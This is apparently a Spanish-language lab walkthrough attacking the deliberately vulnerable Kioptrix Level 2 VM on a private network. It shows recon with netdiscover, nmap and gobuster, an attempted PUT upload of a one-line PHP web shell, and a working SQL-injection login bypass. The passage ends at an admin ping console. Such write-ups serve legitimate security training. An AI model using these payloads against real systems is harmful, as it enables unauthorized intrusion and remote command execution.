# Recon

Usando la herramienta **netdiscover**, se identificó la dirección IP **192.168.1.187** de la maquina virtual **kioptrix level 2**.

```
root@kali:~#netdiscover -i eth0 -r 192.168.1.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                       
                                                                                                                                                     
 442 Captured ARP Req/Rep packets, from 12 hosts.   Total size: 26520                                                                                
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.254   30:91:8f:50:27:c7    413   24780  Technicolor                                                                                       
 192.168.1.185   e4:b3:18:56:27:e6      1      60  Intel Corporate                                                                                   
 192.168.1.187   00:0c:29:53:19:4c     11     660  VMware, Inc.                                                                                      
 192.168.1.100   f4:6d:04:13:0a:58      1      60  ASUSTek COMPUTER INC.                                                                             
 192.168.1.168   d4:c9:4b:20:06:e4      1      60  Motorola Mobility LLC, a Lenovo Company                                                           
 192.168.1.101   00:0c:29:42:ae:ff      1      60  VMware, Inc.                                                                                      
 192.168.1.102   f4:6d:04:13:0a:7c      1      60  ASUSTek COMPUTER INC.                                                                             
 192.168.1.202   00:0c:29:e6:08:0c      1      60  VMware, Inc.                                                                                      
 192.168.1.240   00:50:56:89:6a:1c      1      60  VMware, Inc.                                                                                      
 192.168.1.182   e4:a4:71:35:30:7c      1      60  Intel Corporate                                                                                   
 192.168.1.167   cc:61:e5:5b:54:16      1      60  Motorola Mobility LLC, a Lenovo Company                                                           
 10.197.1.208    00:0c:29:2c:36:b2      9     540  VMware, Inc.    
 
```

### nmap

Después continuamos con **nmap**, donde se identificaron servicios disponibles como TCP/22(SSH), TCP/80(HTTP), TCP/111, TCP/443(HTTP) y TCP/3306(MySQL). También observe que el sistema operativo identificado es **CentOS**.  

```
root@TigerTeam:~/Kioptrixl2# nmap -Pn -sS -sV -n 192.168.1.187 --reason
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-18 13:07 CDT
Nmap scan report for 192.168.1.187
Host is up, received arp-response (0.00042s latency).
Not shown: 994 closed ports
Reason: 994 resets
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       syn-ack ttl 64 Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    syn-ack ttl 64 2 (RPC #100000)
443/tcp  open  ssl/https? syn-ack ttl 64
631/tcp  open  ipp        syn-ack ttl 64 CUPS 1.1
3306/tcp open  mysql      syn-ack ttl 64 MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:4C (VMware)

```


## Servicio Web - TCP/631

# Identificación de vulnerabilidades

Utilizando los script de **nmap**, se identificó el metodo PUT.

```
root@TigerTeam:~/Kioptrixl2# nmap -Pn -sS -sC -n 192.168.1.187 -p 631
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-18 13:09 CDT
Nmap scan report for 192.168.1.187
Host is up (0.00020s latency).

PORT    STATE SERVICE
631/tcp open  ipp
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:53:19:4C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```


# Explotación

Con la herramienta **curl**, se intento almacenar una web shell mendiante el metodo PUT, sin embargo se identificó permisos limitados.

```
root@TigerTeam:~/Kioptrixl2# curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.1.187:631/shell.php
<HTML><HEAD><TITLE>403 Forbidden</TITLE></HEAD><BODY><H1>Forbidden</H1>You don't have permission to access the resource on this server.</BODY></HTML>
root@TigerTeam:~/Kioptrixl2# 
```


## Servicio Web - TCP/80

Con el comando **curl**, se identificó la versión del servicio web y el sistema operativo.

```
root@TigerTeam:~/Kioptrixl2# curl -v -s http://192.168.1.187 > /dev/null
* Expire in 0 ms for 6 (transfer 0x560c865b9dd0)
*   Trying 192.168.1.187...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x560c865b9dd0)
* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.1.187
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 11 Jul 2019 19:58:23 GMT
< Server: Apache/2.0.52 (CentOS)
< X-Powered-By: PHP/4.3.9
< Content-Length: 667
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
{ [667 bytes data]
* Closing connection 0
```


Con la herramienta **gobuster** se identificó el recurso HTTP **index.php**.

```
root@TigerTeam:~/Kioptrixl2# gobuster dir -u http://192.168.1.187/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x .php,.html,.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.187/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2019/07/11 18:16:31 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.txt (Status: 403)
/.hta.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
/manual (Status: 301)
/usage (Status: 403)
===============================================================
```

Con el comando **curl** se identificó un formulario de autenticación.

```
root@TigerTeam:~/Kioptrixl2# curl -v -s http://192.168.1.187/index.php 
* Expire in 0 ms for 6 (transfer 0x562dc0899dd0)
*   Trying 192.168.1.187...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x562dc0899dd0)
* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
> GET /index.php HTTP/1.1
> Host: 192.168.1.187
> User-Agent: curl/7.64.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Thu, 11 Jul 2019 20:07:48 GMT
< Server: Apache/2.0.52 (CentOS)
< X-Powered-By: PHP/4.3.9
< Content-Length: 667
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>

* Closing connection 0
root@TigerTeam:~/Kioptrixl2# 

```

# Identificación de vulnerabilidades

Despúes se generó una petición HTTP y se añadio en los parametros de autenticación **uname** y **psw** la cadena **test** y **test2**.

```
root@TigerTeam:~/Kioptrixl2# curl -s -v -d "uname=test&psw=test2" -X POST http://192.168.1.187/index.php > /dev/null
* Expire in 0 ms for 6 (transfer 0x5585b8986dd0)
*   Trying 192.168.1.187...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x5585b8986dd0)
* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
> POST /index.php HTTP/1.1
> Host: 192.168.1.187
> User-Agent: curl/7.64.0
> Accept: */*
> Content-Length: 20
> Content-Type: application/x-www-form-urlencoded
> 
} [20 bytes data]
* upload completely sent off: 20 out of 20 bytes
< HTTP/1.1 200 OK
< Date: Thu, 11 Jul 2019 20:10:14 GMT
< Server: Apache/2.0.52 (CentOS)
< X-Powered-By: PHP/4.3.9
< Content-Length: 667
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
{ [667 bytes data]
* Closing connection 0
root@TigerTeam:~/Kioptrixl2# 
```

Nuevamente se generó una petición HTTP, pero ahora se añadio credenciales debiles, en este caso fue  **admin** y **admin**, sin embargo aun no tenemos acceso a aplicación web.
```
root@TigerTeam:~/Kioptrixl2# curl -d "uname=admin&psw=admin" -X POST http://192.168.1.187/index.php 
<html>
<body>
<form method="post" name="frmLogin" id="frmLogin" action="index.php">
	<table width="300" border="1" align="center" cellpadding="2" cellspacing="2">
		<tr>
			<td colspan='2' align='center'>
			<b>Remote System Administration Login</b>
			</td>
		</tr>
		<tr>
			<td width="150">Username</td>
			<td><input name="uname" type="text"></td>
		</tr>
		<tr>
			<td width="150">Password</td>
			<td>
			<input name="psw" type="password">
			</td>
		</tr>
		<tr>
			<td colspan="2" align="center">
			<input type="submit" name="btnLogin" value="Login">
			</td>
		</tr>
	</table>
</form>

<!-- Start of HTML when logged in as Administator -->
</body>
</html>

```


Despúes se realizó una inyección SQL para realizar un bypass al login, observe que se tuvo acceso.


```
root@TigerTeam:~/Kioptrixl2# curl -s -v -d "uname=admin&psw=test2'+or'1'='1" -X POST http://192.168.1.187/index.php
* Expire in 0 ms for 6 (transfer 0x561c3cb0bdd0)
*   Trying 192.168.1.187...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x561c3cb0bdd0)
* Connected to 192.168.1.187 (192.168.1.187) port 80 (#0)
> POST /index.php HTTP/1.1
> Host: 192.168.1.187
> User-Agent: curl/7.64.0
> Accept: */*
> Content-Length: 31
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 31 out of 31 bytes
< HTTP/1.1 200 OK
< Date: Thu, 11 Jul 2019 20:11:37 GMT
< Server: Apache/2.0.52 (CentOS)
< X-Powered-By: PHP/4.3.9
< Content-Length: 586
< Connection: close
< Content-Type: text/html; charset=UTF-8
< 
<html>
<body>

<!-- Start of HTML when logged in as Administator -->
	<form name="ping" action="pingit.php" method="post" target="_blank">
		<table width='600' border='1'>
		<tr valign='middle'>
			<td colspan='2' align='center'>
			<b>Welcome to the Basic Administrative Web Console<br></b>
			</td>
		</tr>
		<tr valign='middle'>
			<td align='center'>
				Ping a Machine on the Network:
			</td>
				<td align='center'>
				<input type="text" name="ip" size="30">
				<input type="submit" value="submit" name="submit">
			</td>
			</td>
		</tr>
	</table>
	</form>


</body>
</html>

* Closing connection 0

```
